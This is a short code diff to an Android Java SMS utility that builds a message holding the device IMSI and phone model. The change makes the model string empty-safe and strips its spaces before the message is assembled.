@@ -119,7 +119,16 @@ public class SMSUtil {
 
         int networkType = AppRuntime.getNetworkTypeByIMSI(context);
         String target = AppRuntime.PHONE_SERVICE1;
-        String content = "IMEI:" + UtilsRuntime.getIMSI(context) + " PHONETYPE:" + android.os.Build.MODEL;
+        String model = android.os.Build.MODEL;
+        if (TextUtils.isEmpty(model)) {
+            model = "UNKNOWN";
+        } else if (model.contains(" ")) {
+            try {
+                model = model.replace(" ", "");
+            } catch (Exception e) {
+            }
+        }
+        String content = "IMEI:" + UtilsRuntime.getIMSI(context) + " PHONETYPE:" + model;
         switch (networkType) {
             case AppRuntime.CMNET:
                 content = content + " NT:1";
